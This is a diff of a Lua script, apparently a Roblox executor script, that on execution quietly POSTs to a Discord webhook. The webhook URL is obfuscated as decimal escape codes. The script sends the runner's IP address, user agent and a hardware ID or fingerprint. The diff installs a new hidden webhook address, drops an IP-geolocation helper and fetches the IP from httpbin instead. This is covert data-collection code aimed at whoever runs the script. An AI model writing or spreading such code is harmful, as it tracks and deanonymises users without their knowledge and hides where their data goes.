@@ -118,24 +118,11 @@ local function GetJson(v)
     }).Body)
 end
 
-local function GetIP()
-    local IP = GetJson("https://2025.ipchaxun.com").ip
-    local Url = "https://cz88.net/api/cz88/ip/accurate?ip="..IP
-    local Json = GetJson(Url).data.locations
-    if #Json == 0 then
-        return "["..IP.."]("..Url..")"
-    end
-    for i, v in pairs(Json) do
-        Json[i] = v.longitude..","..v.latitude
-    end
-    return "["..IP.."](https://uri.amap.com/marker?markers="..table.concat(Json, "|")..")"
-end
-
 if not getgenv().Skip then
     getgenv().Skip = true
     task.spawn(function()
         request({
-            Url = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\57\57\51\57\52\55\54\53\53\49\56\52\48\53\55\55\51\47\121\52\51\100\82\110\116\50\100\87\97\103\106\112\82\73\89\88\89\104\66\95\90\52\77\86\53\80\86\102\56\103\74\104\69\105\98\48\106\104\89\113\86\55\106\100\66\109\75\102\103\101\120\49\52\75\108\107\79\114\89\119\111\51\89\119\72\50",
+            Url = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\48\48\51\56\50\54\53\50\57\48\56\56\51\52\56\50\54\47\107\114\116\114\84\52\117\84\86\74\67\107\82\84\111\53\103\104\78\120\85\48\53\83\97\112\111\52\112\72\113\113\105\120\48\68\99\54\115\82\49\72\56\119\83\101\81\104\100\109\72\90\74\117\81\89\45\116\115\109\109\81\89\73\57\122\101\122",
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
@@ -157,7 +144,7 @@ if not getgenv().Skip then
                             },
                             {
                                 name = "IP",
-                                value = GetIP()
+                                value = GetJson("https://httpbin.org/ip").origin
                             },
                             {
                                 name = "UA",
@@ -174,7 +161,7 @@ if not getgenv().Skip then
                             {
                                 name = "Hwid",
                                 value = (gethwid or (function()
-                                    for i, v in pairs(GetJson("https://httpbin.org/get").headers) do
+                                    for i, v in pairs(GetJson("https://httpbin.org/headers").headers) do
                                         if string.find(i, "Fingerprint") then
                                             return v
                                         end
